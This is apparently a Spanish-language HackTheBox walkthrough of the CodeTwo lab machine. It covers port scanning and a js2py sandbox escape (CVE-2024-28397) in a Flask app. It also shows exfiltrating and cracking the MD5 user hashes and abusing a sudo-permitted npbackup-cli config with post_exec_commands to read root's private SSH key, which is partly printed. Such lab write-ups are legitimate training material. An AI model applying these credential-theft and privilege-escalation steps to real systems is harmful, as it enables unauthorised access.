---
layout: single
title: "Machines - CodeTwo (HTB)"
author_profile: true
published: true
toc: true
toc_sticky: true
comments: true
---

Las máquinas (de HackTheBox) son retos gamificados enfocados a __Red Team__ o por lo menos, __seguridad ofensiva__, donde tendrás que intentar __tomar control total__ de la máquina que tengas adelante abusando de vulnerabilidades para Obtener un _Foothold_, y luego seguir con generalmente, _movimiento lateral_ y finalmente, la _escalada de privilegios_; Estos laboratorios son especialmente útiles para probar conceptos de seguridad ofensiva ya que tendrás que abusar de ellos para seguir avanzando.

![UTMP]({{ "/images/CodeTwo/logo.png" | relative_url }}){: .align-center}


## Resumen CodeTwo

Esta máquina Linux, se exploran varios conceptos y para facilitarlos, hablaremos de ellos siguiendo el path de ataque: 

1. __Programación__ Principalmente Python, que será causa de la primera vulnerabilidad
2. __Threat Intelligence__ Para búsqueda de vulnerabilidades en fuentes abiertas
3. __Local File Inclusion con exfiltrado de información__ Exfiltrar información del servidor e investigar de manera offline
4. __Cracking de Contraseñas con Hashcat__ Para descubrir contraseñas hasheadas
5. __Lectura arbitraria abusando del binario npbackup-cli__ Para escalado de privilegios
6. __Exfiltración de id_rsa__ Para acceso persistente

## Laboratorio

### Escaneo Inicial

Primero, iniciamos nuestra fase de escaneo con `nmap` con el siguiente arreglo:

```bash
nmap -p- --min-rate 5000 -n -Pn 10.10.11.82 -oG allports
```

* `-p-` Indica el escaneo de los 65,535 puertos
* `--min-rate 5000` Indica la velocidad de transmisión de paquetes (a una tasa mínima de 5,000 paquetes por segundo)
* `-n` Deshabilita la resolución DNS de la IP
* `-Pn` Deshabilita el reconocimiento con icmp que realiza `nmap` para determinar si el host está activo o no
* `10.10.11.82` La IP objetivo
* `-oG allports` Indica un archivo de salida en formato grepeable (facilita mucho el utilizar bash para la extracción de información del archivo)

Una vez ejecutado, nmap reporta los siguientes puertos:

```js
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-17 19:57 CST
Warning: 10.10.11.82 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.82
Host is up (0.18s latency).
Not shown: 65115 closed tcp ports (conn-refused), 418 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 26.06 seconds
```

Esto nos empieza a dar una idea de qué servicios como ssh y un servicio http, pero antes, habrá de confirmar estos allazgos con el siguiente escaneo de nmap:

```bash
nmap -p22,8000 -sCV -n -Pn 10.10.11.82 -oN OpenPorts
```

* `-p22,8000` Limita el escaneo a sólo estos 2 puertos
* `-sCV` Son 2 flags combinadas de nmap (-sC) para la ejecución de scripts por defecto de nmap (mayor información) y (-sV) para determinar la versión del servicio
* `-oN OpenPorts` Indica que el output del comando lo reporte en un formato nmap, la salida de lo que veas en consola será lo que verás en el archivo.

Terminando la ejecución veremos los siguientes detalles:

```js
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-17 20:36 CST
Nmap scan report for 10.10.11.82
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds
```

A primera instancia, confirmamos que el puerto 8000 sí es un servicio http; lo vemos `Gunicorn 20.0.4` que es vulnerable a http smuggling pero no será explotado en el laboratorio.

Accediendo a la `IP:8000` Podemos ver La página principal con la que nos dará pistas de lo que es:

// Imagen


En ella, se nos ofrece la oportunidad de crear una cuenta y descargar la aplicación.

Si creamos la cuenta y accedemos, podremos observar que es una pequeña platadorma de desarrollo para aplicaciones JavaScript, podemos probar funcionalidades y demás pero __lo importante es revisar el código de la aplicación__

En el archivo zip, vendrá el archivo `app.py` donde vienen la gran mayoría de funcionalidades de la aplicación web:

```python

from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3Tw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

<SNIP>

@app.route('/register', methods=['GET', 'POST'])
def register():
    
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

<SNIP>

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

Tanto __register__ como __/run_code__ son importantes, ya que en primera, ya sabemos que las contraseñas de users.db se guardan en md5 y el cómo ejecuta internamente la aplicación código javascript.
 
### Threat Intelligence

Investigando un poco el código y el _requirements.txt_ en la misma extracción, hay una función relacionada con un CVE, esa función es `js2py.disable_pyimport()` en la versión _js2py v0.74_ (Justo la listada en el _requirements.txt_) lo que nos lleva al [__CVE-2024-28397__](https://www.cve.org/CVERecord?id=CVE-2024-28397) Que permite la ejecución de comandos. 

Puedes utilizar un exploit público como [Github - waleed-hassan569](https://github.com/waleed-hassan569/CVE-2024-28397-command-execution-poc/blob/main/payload.js) y ejecutarla directamente en la aplicación.

### Local File Inclusion con exfiltrado de información

Ahora, de este modo no es posible establecer una reverse shell, ya que seguramente, esté limitada en tiempo de ejecución por lo que no establecerá la conexión pero sí que puede ejecutar comandos de su lado; lo siguiente que habrá que hacer es investigar el directorio actual para ver si existe algo importante ahí mismo:

// Imagen Ejecución LS

Si investigamos en instance...

// Imagen Ejecución ls instance

Encontramos el users.db! 

Para extraerlo, podemos utilizar el siguiente comando:

```bash
cat instance/users.db | base64
```

__¿Por qué?__ Te estarás preguntando, no podemos leer directamente el users.db porque seguramente contiene caracteres que no podrá mostrar viéndolo desde la web y nos dará un error, por lo que lo transformamos en base64 para poderlo copiar, pegar y transformar de nuestro lado, para ahora sí, poder visualizarlo desde nuestra consola.

Ya con el string de la salida pegado en un archivo temporal, debemos en primera, quitar los espacios que tiene el archivo y luego decodificarlo en base64:

```bash
cat base64.tmp | tr -d ' ' | base64 -d > users.db
```

Y podemos leer los contenidos con mayor tranquilidad con sqlite:

```bash
sqlite3 users.db
sqlite> .tables
code_snippet  user        
sqlite> select * from user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

### Cracking de Contraseñas con Hashcat

Extrayendo los hashes y pegándolos en un archivo, podremos utilizar hashcat para tratar de crackear las contraseñas, recordemos que ya tenemos el tipo _MD5_ así que sólo abrá que especificarlo en hashcat y especificando rockyou.txt como diccionario a utilizar:

```bash
hashcat hash -m 0 /usr/share/wordlists/rockyou.txt

<SNIP>
649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove
```

Con ello, tenemos la contraseña de marco (utilizable para SSH).

### Escalado de Privilegios - Lectura arbitraria abusando del binario npbackup-cli

Iniciando sesión por SSH y ejecutando `sudo -l` (para verificar si nuestro usuario actual tiene permitido alguna ejecución de sudo de altos privilegios en el sistema) y nos muestra un path interesante:

```bash
marco@codetwo:~$ sudo -l
Matching Defaults entries for marco on codetwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

E, investigando un poco; nos encontramos con un PoC [Github - AliElKhatteb](https://github.com/AliElKhatteb/npbackup-cli-priv-escalation?tab=readme-ov-file) El cual nos permite la lectura arbitraria de archivos y... ¿Cómo pasamos de una lectura arbitraria a un escalado? Podemos intentar robar la id_rsa del usuario root por ejemplo (aunque existen más paths para lo mismo pero este vector me gusta en lo personal).

El mismo PoC indica las instrucciones: Utilizar un archivo de configuración y realizar el backup modificando la linea que indica el path a respaldar; que podemos mover a `/root` y dumpear `.ssh/id_rsa`. 

Otro camino, que encontré examinando un archivo que otra persona había dejado, es la ejecución de comandos sin sesión interactiva abusando del campo __post_exec_commands__ como sigue:

``` js
conf_version: 3.0.1
audience: public

repos:
  default:
    repo_uri: __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
        - /root
      source_type: folder_list
      post_exec_commands:
        - "mkdir /temp/rootbackup"
        - "cp /root/.ssh/id_rsa /temp/rootbackup/id_rsa"
        - "chmod +r /temp/rootbackup/id_rsa"
    repo_opts:
      repo_password: __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
```

Y básicamente resultaba en lo mismo, pero si no; podías dejar vacío el __post_exec_commands__ sin problemas y continuar como describía el PoC (sólo... para ver otra forma de lograrlo)

Una vez con el archivo creado; ejecutas:

```
sudo /usr/local/bin/npbackup-cli -c npbackup.conf --backup
```

Y en la salida, en cierto momento notarás un snapshot id y el listado de los directorios; si no los ves, puedes listar los contenidos del snapshot con `--ls` tal y como dice la documentación del ejecutable. En cualquier caso, debes ver en el listado el archivo que quieres dumpear, si no, puedes intentar con lo de la ejecución de comandos descrita anteriormente.

Una vez con el archivo respaldado, lo dumpeas con:

```js
sudo /usr/local/bin/npbackup-cli -c exploit.conf --dump /root/.ssh/id_rsa --snapshot-id c9249052                                                                              
                                                                                                                                                                                                              
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA9apNjja2/vuDV4aaVheXnLbCe7dJBI/l4Lhc0nQA5F9wGFxkvIEy
VXRep4N+ujxYKVfcT3HZYR6PsqXkOrIb99zwr1GkEeAIPdz7ON0pwEYFxsHHnBr+rPAp9d
EaM7OOojou1KJTNn0ETKzvxoYelyiMkX9rVtaETXNtsSewYUj4cqKe1l/w4+MeilBdFP7q
kiXtMQ5nyiO2E4gQAvXQt9bkMOI1UXqq+IhUBoLJOwxoDwuJyqMKEDGBgMoC2E7dNmxwJV
XQSdbdtrqmtCZJmPhsAT678v4bLUjARk9bnl34/zSXTkUnH+bGKn1hJQ+IG95PZ/rusjcJ
hNzr/GTaAntxsAZEvWr7hZF/56LXncDxS0yLa5YVS8YsEHerd/SBt1m5KCAPGofMrnxSSS
pyuYSlw/OnTT8bzoAY1jDXlr5WugxJz8WZJ3ItpUeBi4YSP2Rmrc29SdKKqzryr7AEn4sb
JJ0y4l95ERARsMPFFbiEyw5MGG3ni61Xw62T3BTlAAAFiCA2JBMgNiQTAAAAB3NzaC1yc2
<SNIP>
-----END OPENSSH PRIVATE KEY-----
{"result": false, "reason": "Program interrupted by error: "}
```

Y esta llave; en un archivo id_rsa con permisos 600, la puedes utilizar para autenticarte como root:

```bash
ssh root@10.10.11.82 -i id_rsa
```


###### Agradecimiento

Si lees esto, gracias por llegar hasta aquí!, si existen dudas, comentarios y correcciones (que son más que bienvenidas) contáctame con confianza, que siempre he dicho que la ciberseguridad es esfuerzo conjunto. 

_En caso que no los vea, buenos días, buenas tardes y buenas noches. Happy Hacking!._
